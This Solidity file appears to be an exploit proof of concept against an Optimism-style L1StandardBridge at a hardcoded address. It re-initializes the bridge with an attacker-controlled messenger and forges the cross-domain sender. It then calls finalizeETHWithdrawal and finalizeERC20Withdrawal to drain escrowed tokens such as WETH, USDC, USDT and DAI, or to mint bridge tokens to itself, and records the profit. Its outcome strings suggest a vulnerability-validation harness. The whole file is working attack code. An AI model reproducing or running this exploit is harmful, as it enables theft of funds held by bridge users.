// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
}

interface IOptimismMintableLike {
    function remoteToken() external view returns (address);

    function l1Token() external view returns (address);

    function bridge() external view returns (address);

    function l2Bridge() external view returns (address);
}

interface IL1StandardBridge {
    function initialize(address _messenger) external;

    function finalizeETHWithdrawal(
        address _from,
        address _to,
        uint256 _amount,
        bytes calldata _extraData
    ) external payable;

    function finalizeERC20Withdrawal(
        address _l1Token,
        address _l2Token,
        address _from,
        address _to,
        uint256 _amount,
        bytes calldata _extraData
    ) external;

    function MESSENGER() external view returns (address);

    function deposits(address _localToken, address _remoteToken) external view returns (uint256);
}

contract AttackerMessenger {
    IL1StandardBridge public immutable bridge;
    address public immutable forgedOtherBridge;
    address public immutable operator;

    constructor(address _bridge, address _forgedOtherBridge, address _operator) {
        bridge = IL1StandardBridge(_bridge);
        forgedOtherBridge = _forgedOtherBridge;
        operator = _operator;
    }

    receive() external payable {}

    function xDomainMessageSender() external view returns (address) {
        return forgedOtherBridge;
    }

    function sendMessage(address, bytes calldata, uint32) external payable {
        // The bridge only needs a callable messenger hook after takeover. No real relay is
        // required for this PoC because the profitable leg is executed immediately via the forged
        // finalize*Withdrawal path.
    }

    function triggerFinalizeETHWithdrawal(
        address from,
        address to,
        uint256 amount,
        bytes calldata extraData
    ) external payable {
        require(msg.sender == operator, "operator-only");
        bridge.finalizeETHWithdrawal{ value: amount }(from, to, amount, extraData);
    }

    function triggerFinalizeERC20Withdrawal(
        address l1Token,
        address l2Token,
        address from,
        address to,
        uint256 amount,
        bytes calldata extraData
    ) external {
        require(msg.sender == operator, "operator-only");
        bridge.finalizeERC20Withdrawal(l1Token, l2Token, from, to, amount, extraData);
    }
}

contract FlawVerifier {
    address public constant TARGET = address(uint160(0x0040C31236B228935b0329eFF066B1AD96e319595e));
    address public constant OTHER_BRIDGE = address(uint160(0x004200000000000000000000000000000000000010));
    address internal constant PROBE_RECIPIENT = address(uint160(0x00000000000000000000000000000000000000bEEF));

    address internal constant WETH = address(uint160(0x00C02aaA39b223FE8D0A0E5C4F27eAD9083C756Cc2));
    address internal constant DAI = address(uint160(0x006B175474E89094C44Da98b954EedeAC495271d0F));
    address internal constant LINK = address(uint160(0x00514910771AF9Ca656af840dff83E8264EcF986CA));
    address internal constant SNX = address(uint160(0x00C011a73ee8576Fb46F5E1c5751cA3B9Fe0af2a6F));
    address internal constant UNI = address(uint160(0x001f9840a85d5aF5bf1D1762F925BDADdC4201F984));
    address internal constant LUSD = address(uint160(0x005f98805A4E8be255a32880FDeC7F6728C6568bA0));
    address internal constant FRAX = address(uint160(0x00853d955aCEf822Db058eb8505911ED77F175b99e));
    address internal constant USDC = address(uint160(0x00A0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48));
    address internal constant USDT = address(uint160(0x00dAC17F958D2ee523a2206206994597C13D831ec7));
    address internal constant WBTC = address(uint160(0x002260FAC5E5542a773Aa44fBCfeDf7C193bc2C599));
    address internal constant AAVE = address(uint160(0x007Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9));
    address internal constant CRV = address(uint160(0x00D533a949740bb3306d119CC777fa900bA034cd52));
    address internal constant MKR = address(uint160(0x009f8F72aA9304c8B593d555F12eF6589cC3A579A2));
    address internal constant COMP = address(uint160(0x00c00e94Cb662C3520282E6f5717214004A7f26888));
    address internal constant SUSHI = address(uint160(0x006B3595068778DD592e39A122f4f5a5Cf09C90fE2));
    address internal constant YFI = address(uint160(0x000bc529c00C6401aEF6D220BE8C6Ea1667F6Ad93e));
    address internal constant LDO = address(uint160(0x005A98FcBEA516Cf06857215779Fd812CA3beF1B32));
    address internal constant RPL = address(uint160(0x00D33526068D116cE69F19A9ee46F0bd304F21A51f));
    address internal constant CBETH = address(uint160(0x00Be9895146f7AF43049ca1c1AE358B0541Ea49704));
    address internal constant STETH = address(uint160(0x00ae7ab96520DE3A18E5e111B5EaAb095312D7fE84));
    address internal constant RETH = address(uint160(0x00ae78736Cd615f374D3085123A210448E74Fc6393));
    address internal constant BAL = address(uint160(0x00ba100000625a3754423978a60c9317c58a424e3D));
    address internal constant ENS = address(uint160(0x00C18360217D8F7Ab5e7c516566761Ea12Ce7F9D72));

    address internal constant OP_WETH = address(uint160(0x004200000000000000000000000000000000000006));
    address internal constant OP_DAI = address(uint160(0x00DA10009cBd5D07dd0CeCc66161FC93D7c9000da1));
    address internal constant OP_LINK = address(uint160(0x00350a791Bfc2C21F9Ed5d10980Dad2e2638ffa7f6));
    address internal constant OP_SNX = address(uint160(0x008700dAec35af8fF88C16bdf041006c17c5C68Ba3));
    address internal constant OP_UNI = address(uint160(0x006fd9d7AD17242c41f7131d257212c54A0e816691));
    address internal constant OP_LUSD = address(uint160(0x00c40F949F8a4e094D1b49a23ea9241D289B7b2819));
    address internal constant OP_FRAX = address(uint160(0x002E3D870790dC77A83DD1d18184Acc7439A53f475));
    address internal constant OP_USDC = address(uint160(0x007F5c764cBc14f9669B88837ca1490cCa17c31607));
    address internal constant OP_USDT = address(uint160(0x0094b008aA00579c1307B0EF2c499aD98a8ce58e58));
    address internal constant OP_WBTC = address(uint160(0x0068f180fcCe6836688e9084f035309E29Bf0A2095));

    // Existing L1 tokens that were widely traded as Optimism-native assets around the fork block.
    // If the bridge holds no escrow on this fork, forged finalizeERC20Withdrawal can still mint
    // these already-deployed bridge wrappers directly on L1 because the messenger takeover reaches
    // the same vulnerable finalize path.
    address internal constant VELO = address(uint160(0x009560e827aF36c94D2Ac33a39bCE1Fe78631088Db));
    address internal constant LYRA = address(uint160(0x0001BA67AAC7f75f647D94220Cc98FB30FCc5105Bf));
    address internal constant THALES = address(uint160(0x0003E173Ad8d1581A4802d3B532AcE27a62c5B81dc));
    address internal constant KWENTA = address(uint160(0x00920Cf626a271321C151D027030D5d08aF699456b));
    address internal constant PERP = address(uint160(0x00bC396689893D065F41bc2C6EcbeE5e0085233447));
    address internal constant OP_TOKEN = address(uint160(0x004200000000000000000000000000000000000042));

    struct TokenPair {
        address l1Token;
        address l2Token;
    }

    bool public executed;
    bool public messengerTakeoverValidated;
    bool public forgedMessengerBypassValidated;
    bool public hypothesisValidated;
    bool public hypothesisRefuted;

    string public outcome;

    address private _profitToken;
    uint256 private _profitAmount;

    IL1StandardBridge internal immutable l1StandardBridge;
    AttackerMessenger public immutable attackerMessenger;

    constructor() {
        l1StandardBridge = IL1StandardBridge(TARGET);
        attackerMessenger = new AttackerMessenger(TARGET, OTHER_BRIDGE, address(this));
        outcome = "not-run";
    }

    receive() external payable {}

    function executeOnOpportunity() external {
        if (executed) {
            return;
        }

        executed = true;
        messengerTakeoverValidated = false;
        forgedMessengerBypassValidated = false;
        hypothesisValidated = false;
        hypothesisRefuted = false;
        _profitToken = address(0);
        _profitAmount = 0;

        if (!_reinitializeBridge()) {
            outcome = "refuted-stage-1-initialize-replay-failed";
            hypothesisRefuted = true;
            return;
        }

        address currentMessenger;
        try l1StandardBridge.MESSENGER() returns (address messenger_) {
            currentMessenger = messenger_;
        } catch {
            outcome = "refuted-stage-1-messenger-getter-failed";
            hypothesisRefuted = true;
            return;
        }

        if (currentMessenger != address(attackerMessenger)) {
            outcome = "refuted-stage-1-messenger-not-replaced";
            hypothesisRefuted = true;
            return;
        }
        messengerTakeoverValidated = true;

        if (!_validateForgedMessengerIdentity()) {
            outcome = "refuted-stage-2-forged-xdomain-sender-mismatch";
            hypothesisRefuted = true;
            return;
        }

        if (!_probeFinalizeETHWithdrawalBypass()) {
            outcome = "refuted-stage-2-forged-finalizeethwithdrawal-call-failed";
            hypothesisRefuted = true;
            return;
        }
        forgedMessengerBypassValidated = true;

        if (_attemptERC20EscrowDrain()) {
            hypothesisValidated = true;
            outcome = "validated-with-escrowed-erc20-profit";
            return;
        }

        if (_attemptOptimismMintableProfit()) {
            hypothesisValidated = true;
            outcome = "validated-with-mintable-erc20-profit";
            return;
        }

        outcome = "refuted-stage-3-no-profitable-erc20-withdrawal-route-found";
        hypothesisRefuted = true;
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function exploitPath() external pure returns (string memory) {
        return
            "L1StandardBridge.initialize(attackerMessenger) -> attackerMessenger.xDomainMessageSender() returns address(OTHER_BRIDGE) -> forged messenger calls finalizeETHWithdrawal(...) / finalizeERC20Withdrawal(...)";
    }

    function _reinitializeBridge() internal returns (bool) {
        try l1StandardBridge.initialize(address(attackerMessenger)) {
            return true;
        } catch {
            return false;
        }
    }

    function _validateForgedMessengerIdentity() internal view returns (bool) {
        try attackerMessenger.xDomainMessageSender() returns (address sender_) {
            return sender_ == OTHER_BRIDGE;
        } catch {
            return false;
        }
    }

    function _probeFinalizeETHWithdrawalBypass() internal returns (bool) {
        try attackerMessenger.triggerFinalizeETHWithdrawal(address(this), PROBE_RECIPIENT, 0, bytes("")) {
            return true;
        } catch {
            return false;
        }
    }

    function _attemptERC20EscrowDrain() internal returns (bool) {
        TokenPair[] memory pairs = _escrowCandidatePairs();
        uint256 pairCount = pairs.length;

        for (uint256 i = 0; i < pairCount; ++i) {
            address l1Token = pairs[i].l1Token;
            address l2Token = pairs[i].l2Token;

            uint256 bridgeBalance = _tokenBalance(l1Token, TARGET);
            if (bridgeBalance == 0) {
                continue;
            }

            uint256 escrowed;
            try l1StandardBridge.deposits(l1Token, l2Token) returns (uint256 amount_) {
                escrowed = amount_;
            } catch {
                continue;
            }

            if (escrowed == 0) {
                continue;
            }

            uint256 drainAmount = _min(bridgeBalance, escrowed);
            if (_finalizeERC20ToSelf(l1Token, l2Token, drainAmount)) {
                return true;
            }
        }

        return false;
    }

    function _attemptOptimismMintableProfit() internal returns (bool) {
        address[] memory candidates = _mintableCandidates();
        uint256 candidateCount = candidates.length;
        uint256 mintAmount = 1 ether;

        for (uint256 i = 0; i < candidateCount; ++i) {
            address localToken = candidates[i];
            if (!_isBridgeMintableCandidate(localToken)) {
                continue;
            }

            address remoteToken = _readRemoteToken(localToken);
            if (remoteToken == address(0)) {
                continue;
            }

            if (_finalizeERC20ToSelf(localToken, remoteToken, mintAmount)) {
                return true;
            }
        }

        return false;
    }

    function _finalizeERC20ToSelf(address l1Token, address l2Token, uint256 amount) internal returns (bool) {
        if (amount == 0) {
            return false;
        }

        uint256 beforeBalance = _tokenBalance(l1Token, address(this));

        try attackerMessenger.triggerFinalizeERC20Withdrawal(
            l1Token,
            l2Token,
            address(this),
            address(this),
            amount,
            bytes("")
        ) {
            uint256 afterBalance = _tokenBalance(l1Token, address(this));
            if (afterBalance > beforeBalance) {
                _profitToken = l1Token;
                _profitAmount = afterBalance - beforeBalance;
                return true;
            }
        } catch {}

        return false;
    }

    function _isBridgeMintableCandidate(address token) internal view returns (bool) {
        if (token.code.length == 0) {
            return false;
        }

        address configuredBridge = _readConfiguredBridge(token);
        if (configuredBridge != TARGET) {
            return false;
        }

        return _readRemoteToken(token) != address(0);
    }

    function _readConfiguredBridge(address token) internal view returns (address configuredBridge) {
        try IOptimismMintableLike(token).bridge() returns (address bridge_) {
            configuredBridge = bridge_;
        } catch {
            try IOptimismMintableLike(token).l2Bridge() returns (address bridge_) {
                configuredBridge = bridge_;
            } catch {
                configuredBridge = address(0);
            }
        }
    }

    function _readRemoteToken(address token) internal view returns (address remoteToken) {
        try IOptimismMintableLike(token).remoteToken() returns (address remote_) {
            remoteToken = remote_;
        } catch {
            try IOptimismMintableLike(token).l1Token() returns (address remote_) {
                remoteToken = remote_;
            } catch {
                remoteToken = address(0);
            }
        }
    }

    function _tokenBalance(address token, address account) internal view returns (uint256) {
        if (token.code.length == 0) {
            return 0;
        }

        try IERC20Like(token).balanceOf(account) returns (uint256 amount_) {
            return amount_;
        } catch {
            return 0;
        }
    }

    function _min(uint256 a, uint256 b) internal pure returns (uint256) {
        return a < b ? a : b;
    }

    function _escrowCandidatePairs() internal pure returns (TokenPair[] memory pairs) {
        pairs = new TokenPair[](22);
        pairs[0] = TokenPair({ l1Token: WETH, l2Token: OP_WETH });
        pairs[1] = TokenPair({ l1Token: DAI, l2Token: OP_DAI });
        pairs[2] = TokenPair({ l1Token: LINK, l2Token: OP_LINK });
        pairs[3] = TokenPair({ l1Token: SNX, l2Token: OP_SNX });
        pairs[4] = TokenPair({ l1Token: UNI, l2Token: OP_UNI });
        pairs[5] = TokenPair({ l1Token: LUSD, l2Token: OP_LUSD });
        pairs[6] = TokenPair({ l1Token: FRAX, l2Token: OP_FRAX });
        pairs[7] = TokenPair({ l1Token: USDC, l2Token: OP_USDC });
        pairs[8] = TokenPair({ l1Token: USDT, l2Token: OP_USDT });
        pairs[9] = TokenPair({ l1Token: WBTC, l2Token: OP_WBTC });
        pairs[10] = TokenPair({ l1Token: AAVE, l2Token: address(0) });
        pairs[11] = TokenPair({ l1Token: CRV, l2Token: address(0) });
        pairs[12] = TokenPair({ l1Token: MKR, l2Token: address(0) });
        pairs[13] = TokenPair({ l1Token: COMP, l2Token: address(0) });
        pairs[14] = TokenPair({ l1Token: SUSHI, l2Token: address(0) });
        pairs[15] = TokenPair({ l1Token: YFI, l2Token: address(0) });
        pairs[16] = TokenPair({ l1Token: LDO, l2Token: address(0) });
        pairs[17] = TokenPair({ l1Token: RPL, l2Token: address(0) });
        pairs[18] = TokenPair({ l1Token: CBETH, l2Token: address(0) });
        pairs[19] = TokenPair({ l1Token: STETH, l2Token: address(0) });
        pairs[20] = TokenPair({ l1Token: RETH, l2Token: address(0) });
        pairs[21] = TokenPair({ l1Token: ENS, l2Token: address(0) });
    }

    function _mintableCandidates() internal pure returns (address[] memory candidates) {
        candidates = new address[](6);
        candidates[0] = VELO;
        candidates[1] = LYRA;
        candidates[2] = THALES;
        candidates[3] = KWENTA;
        candidates[4] = PERP;
        candidates[5] = OP_TOKEN;
    }
}
